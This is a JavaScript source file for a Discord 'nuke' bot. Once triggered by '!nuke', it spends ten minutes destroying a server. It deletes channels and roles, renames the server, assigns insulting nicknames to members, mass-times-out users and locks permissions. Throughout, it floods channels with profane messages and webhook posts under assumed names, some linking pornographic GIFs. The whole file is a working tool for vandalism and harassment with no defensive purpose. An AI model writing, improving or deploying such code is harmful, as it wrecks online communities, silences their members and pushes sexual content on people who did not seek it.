require('dotenv').config();
const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, Colors } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration,
  ],
});

// ================== CONFIG ==================
const TOKEN = process.env.TOKEN;
const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
const PROTECTED_CHANNEL = 'aaaaaaaa';

// Nuke session settings
const NUKE_DURATION = 10 * 60 * 1000; // 10 minutes
const TICK_INTERVAL = 10*100;       // every 8 seconds during nuke
let nukeActive = false;
let nukeTimeout = null;

// ================== GIF SLOTS ==================
const GIF_TYPE_1 = [
  "https://klipy.com/gifs/orgasm-cumming-1"
];

const GIF_TYPE_2 = [
  "https://klipy.com/gifs/vegan-porn-carrot-porn"
];

// ================== LISTS ==================
const SERVER_NAMES = [
  'NUKED', 'HALLUCINATION', 'SERVER DEAD', 'OWNED', 'RIP',
  'GET FUCKED', 'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE',
  'MINIONS ACTIVE', 'REALITY BROKEN', 'CHAOS OVERLOAD', '10 MIN NUKE',
  'TOTAL COLLAPSE', 'FINAL STAGE', 'NO ESCAPE', 'MINION ARMY'
];

const CHANNEL_NAMES = [
  'nuked', 'destroyed', 'owned', 'rip', 'get-fucked', 'dead',
  'chaos', 'void', 'pain', 'end', 'lmao', 'gg', 'bot-was-here',
  'no-escape', 'server-corpse', 'extreme-nuke', 'minion-zone',
  'hallucination', 'glitch', 'error', 'deleted', 'why',
  'mute-zone', 'screaming', 'help', 'pain-chamber', 'final',
  'minion-spam', 'boss-room', 'collapse', 'broken'
];

const NICKNAMES = [
  'NUKED', 'OWNED', 'RIP', 'GET FUCKED', 'BOT PROPERTY',
  'NO HOPE', 'DESTROYED', 'SERVER CORPSE', 'VICTIM', 'MINION FOOD',
  'MUTED', 'SILENCED', 'BROKEN', '10 MIN VICTIM', 'CHAOS SLAVE'
];

const ROLE_NAMES = [
  'Nuked', 'Owned', 'Destroyed', 'RIP', 'Bot Property', 'No Hope',
  'Minion', 'Glitch', 'Muted', 'Silenced', 'Chaos', 'Victim'
];

const MESSAGES = [
  '**10 MINUTE NUKE ACTIVE**', 'SERVER IS DEAD', 'GET FUCKED',
  'NO SURVIVORS', 'OWNED', 'THE END', 'RIP SERVER',
  'YOU CANNOT STOP THIS', 'BOT WINS', 'GOODBYE',
  'MINIONS ARE HELPING', 'REALITY IS BREAKING', 'TOO FAST',
  'MUTED', 'SILENCE', '10 MINUTES OF PAIN', 'NO ESCAPE',
  'MINION ARMY ONLINE', 'BOSS IS ANGRY', 'COLLAPSE IMMINENT'
];

const MINION_NAMES = [
  'Minion', 'Minion-2', 'Chaos Helper', 'Glitch', 'Slave',
  'Destroyer', 'Spammer', 'Mute Bot', 'Pain', 'Void'
];

const MINION_MESSAGES = [
  'minion reporting', 'chaos incoming', 'you are done',
  'boss ordered this', 'no survivors', 'mute activated',
  'gif spam', 'reality break', '10 min nuke', 'help the boss'
];

// ================== HELPERS ==================
function randomItem(arr) {
  if (!arr || arr.length === 0) return null;
  return arr[Math.floor(Math.random() * arr.length)];
}

function chance(percent) {
  return Math.random() * 100 < percent;
}

async function getOrCreateWebhook(channel, name = 'Minion') {
  try {
    const webhooks = await channel.fetchWebhooks();
    let webhook = webhooks.find(wh => wh.name === name);
    if (!webhook) {
      webhook = await channel.createWebhook({
        name: name,
        reason: 'Chaos Minion',
      });
    }
    return webhook;
  } catch (err) {
    return null;
  }
}

async function safeDelete(channel) {
  if (!channel || channel.name === PROTECTED_CHANNEL) return;
  await channel.delete('10 MIN NUKE').catch(() => {});
}

// ================== BOSS ACTIONS ==================
const bossActions = [
  // Rename server
  async (guild) => {
    await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
    console.log('🔥 Boss renamed server');
  },

  // Mass delete channels
  async (guild) => {
    const channels = [...guild.channels.cache.values()];
    for (const channel of channels) {
      await safeDelete(channel);
    }
    console.log('🗑️ Boss deleted channels');
  },

  // Create many channels
  async (guild) => {
    for (let i = 0; i < 7; i++) {
      try {
        const ch = await guild.channels.create({
          name: randomItem(CHANNEL_NAMES),
          type: ChannelType.GuildText,
        });
        await ch.send(randomItem(MESSAGES)).catch(() => {});
      } catch (e) {}
    }
    console.log('✨ Boss created channels');
  },

  // Create temp channels that self delete
  async (guild) => {
    for (let i = 0; i < 5; i++) {
      try {
        const ch = await guild.channels.create({
          name: randomItem(['temp', 'flash', 'glitch', 'deleted', 'error']),
          type: ChannelType.GuildText,
        });
        await ch.send('👁').catch(() => {});
        setTimeout(() => ch.delete().catch(() => {}), 4000 + Math.random() * 6000);
      } catch (e) {}
    }
  },

  // Delete roles
  async (guild) => {
    const roles = [...guild.roles.cache.values()];
    for (const role of roles) {
      if (role.id === guild.id || !role.editable) continue;
      await role.delete('10 MIN NUKE').catch(() => {});
    }
  },

  // Create roles
  async (guild) => {
    for (let i = 0; i < 6; i++) {
      await guild.roles.create({
        name: randomItem(ROLE_NAMES),
        color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange]),
        reason: '10 MIN NUKE',
      }).catch(() => {});
    }
  },

  // Mass nickname
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot || !member.manageable) continue;
      await member.setNickname(randomItem(NICKNAMES)).catch(() => {});
    }
    console.log('👤 Boss mass nicknamed');
  },

  // Mass mute / timeout
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot || !member.moderatable) continue;
      const time = [60, 120, 300, 600, 1800, 3600][Math.floor(Math.random() * 6)] * 1000;
      await member.timeout(time, '10 MIN NUKE - MUTED').catch(() => {});
    }
    console.log('⏳ Boss mass muted/timed out');
  },

  // Heavy message spam
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
    );
    for (const channel of channels.values()) {
      for (let i = 0; i < 5; i++) {
        await channel.send(randomItem(MESSAGES)).catch(() => {});
      }
    }
  },

  // Lock everything
  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.manageable);
    for (const channel of channels.values()) {
      await channel.permissionOverwrites.edit(guild.roles.everyone, {
        ViewChannel: chance(30),
        SendMessages: false,
        Connect: false,
        Speak: false,
        AddReactions: false,
      }).catch(() => {});
    }
    console.log('🔐 Boss locked permissions');
  },

  // Change bot nickname
  async (guild) => {
    await guild.members.me.setNickname(randomItem([
      '10 MIN NUKE', 'HALLUCINATION', 'MINION BOSS', 'REALITY BREAKER',
      'THE DESTROYER', 'MUTE MASTER', 'CHAOS GOD'
    ])).catch(() => {});
  },

  // Create categories
  async (guild) => {
    for (let i = 0; i < 3; i++) {
      try {
        const cat = await guild.channels.create({
          name: randomItem(['NUKE ZONE', 'MINION ARMY', 'VOID', 'PAIN', 'FINAL']),
          type: ChannelType.GuildCategory,
        });
        setTimeout(() => cat.delete().catch(() => {}), 15000 + Math.random() * 20000);
      } catch (e) {}
    }
  },
];

// ================== MINION ACTIONS ==================
const minionActions = [
  // Classic GIF spam
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    for (const channel of channels.values()) {
      for (const name of MINION_NAMES.slice(0, 4)) {
        const webhook = await getOrCreateWebhook(channel, name);
        if (!webhook) continue;

        for (let i = 0; i < 3; i++) {
          const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
          if (gif) {
            await webhook.send({ content: gif, username: name }).catch(() => {});
          } else {
            await webhook.send({ content: randomItem(MINION_MESSAGES), username: name }).catch(() => {});
          }
        }
      }
    }
    console.log('👾 Minions GIF spammed');
  },

  // Text spam minions
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    for (const channel of channels.values()) {
      const webhook = await getOrCreateWebhook(channel, randomItem(MINION_NAMES));
      if (!webhook) continue;

      for (let i = 0; i < 5; i++) {
        await webhook.send({
          content: randomItem(MINION_MESSAGES),
          username: randomItem(MINION_NAMES),
        }).catch(() => {});
      }
    }
  },

  // Minion creates channels then spams them
  async (guild) => {
    for (let i = 0; i < 3; i++) {
      try {
        const ch = await guild.channels.create({
          name: randomItem(['minion-spam', 'minion-zone', 'help-boss', 'chaos']),
          type: ChannelType.GuildText,
        });
        const webhook = await getOrCreateWebhook(ch, 'Minion');
        if (webhook) {
          for (let j = 0; j < 4; j++) {
            const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
            await webhook.send({ content: gif || randomItem(MINION_MESSAGES), username: 'Minion' }).catch(() => {});
          }
        }
      } catch (e) {}
    }
  },

  // Minion mass reacts / fake activity feel
  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
    for (const channel of channels.values()) {
      const webhook = await getOrCreateWebhook(channel, 'Glitch');
      if (!webhook) continue;
      await webhook.send({
        content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥']),
        username: 'Glitch',
      }).catch(() => {});
    }
  },
];

// ================== MAIN NUKE TICK ==================
async function runNukeTick(guild) {
  if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) {
    console.log('⚠️ Missing Administrator permission');
    return;
  }

  console.log(`\n======== 10 MIN NUKE TICK on ${guild.name} ========`);

  // Run several boss actions
  const selectedBoss = [...bossActions].sort(() => 0.5 - Math.random()).slice(0, 8);
  for (const action of selectedBoss) {
    try {
      await action(guild);
      await new Promise(r => setTimeout(r, 120));
    } catch (err) {
      console.error('❌ Boss error:', err.message);
    }
  }

  // Run minion actions
  const selectedMinions = [...minionActions].sort(() => 0.5 - Math.random()).slice(0, 3);
  for (const action of selectedMinions) {
    try {
      await action(guild);
      await new Promise(r => setTimeout(r, 100));
    } catch (err) {
      console.error('❌ Minion error:', err.message);
    }
  }
}

// ================== START / STOP NUKE ==================
async function startNuke(guild, message) {
  if (nukeActive) {
    if (message) await message.reply('⚠️ Nuke is already running.');
    return;
  }

  nukeActive = true;
  if (message) await message.reply('💣 **10 MINUTE NUKE STARTED**\nMinions + Boss are now destroying the server.');

  console.log('💣 10 MINUTE NUKE SESSION STARTED');

  // First tick immediately
  await runNukeTick(guild);

  // Continue ticking
  const interval = setInterval(async () => {
    if (!nukeActive) {
      clearInterval(interval);
      return;
    }
    await runNukeTick(guild);
  }, TICK_INTERVAL);

  // Stop after 10 minutes
  nukeTimeout = setTimeout(() => {
    nukeActive = false;
    clearInterval(interval);
    console.log('🛑 10 MINUTE NUKE SESSION ENDED');
  }, NUKE_DURATION);
}

// ================== EVENTS ==================
client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`💣 10 MIN NUKE BOT READY`);
  console.log(`Protected channel: ${PROTECTED_CHANNEL}`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;

  if (message.content === '!nuke') {
    await startNuke(message.guild, message);
  }

  if (message.content === '!nuke-stop') {
    nukeActive = false;
    if (nukeTimeout) clearTimeout(nukeTimeout);
    await message.reply('🛑 Nuke session force stopped.');
    console.log('🛑 Nuke force stopped by command');
  }
});

client.login(TOKEN);
